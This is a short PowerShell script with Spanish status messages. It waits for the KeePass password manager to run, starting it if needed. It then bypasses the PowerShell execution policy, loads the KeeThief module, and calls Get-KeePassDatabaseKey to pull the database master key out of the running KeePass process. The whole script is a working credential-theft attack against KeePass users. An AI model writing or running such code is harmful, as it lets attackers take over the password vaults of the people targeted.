Write-Host "Script que detecta si el proceso de keepass está corriendo para utilizar keethief"
$ProcessName = "KeePass"
$FilePath = "c:\Program Files (x86)\KeePass Password Safe 2"
# Bucle infinito hasta que aparezca el proceso
while ($true) {
    $Process = Get-Process -Name $ProcessName -ErrorAction SilentlyContinue
    if ($Process) {
        Write-Host "Proceso $ProcessName encontrado"
        Write-Host "Bypass Execution Policy first"
        Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
        Write-Host "Running KeeThief"
        Import-Module .\KeeThief.ps1
        Get-KeePassDatabaseKey -Verbose
        Get-Process KeePass | Get-KeePassDatabaseKey -Verbose
        Write-Host "Durmiendo 1000"
        Start-Sleep -Seconds 1000
        break
    }
    else {
        Write-Host "Proceso $ProcessName no encontrado"
        Start-Process -FilePath "$FilePath\KeePass.exe"
        Start-Sleep -Seconds 5
    }
}